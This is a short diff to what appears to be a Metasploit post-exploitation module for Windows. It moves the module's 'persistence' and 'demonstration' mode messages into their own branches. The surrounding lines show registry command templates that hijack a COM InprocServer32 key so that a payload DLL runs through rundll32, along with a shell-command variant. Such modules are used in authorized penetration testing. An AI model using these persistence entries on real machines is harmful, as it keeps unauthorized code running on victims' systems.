@@ -220,13 +220,6 @@ def run
     Rex::sleep(1.5)
   end
 
-  # mode sellected
-  if datastore['APPL_PATH'] == true || datastore['RENAME_PERSIST'] == true
-    print_warning("Persistence mode sellected")
-  else
-    print_status("Demonstration mode sellected")
-  end
-
     #
     # Search in target regedit if hijack hive exists .. 
     #
@@ -285,6 +278,7 @@ def run
      # List of registry keys to add to target regedit .. (rundll32.exe payload.dll,main)
      #
      if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
+       print_warning("Persistence mode sellected")
        dll_exe = "rundll32.exe #{app_path},main"
        hacks = [
         '#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{dll_exe}\" /f',
@@ -297,6 +291,7 @@ def run
        #
        # DEMO mode (user inputs)
        #
+       print_status("Demonstration mode sellected")
        hacks = [
         '#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f'
        ]
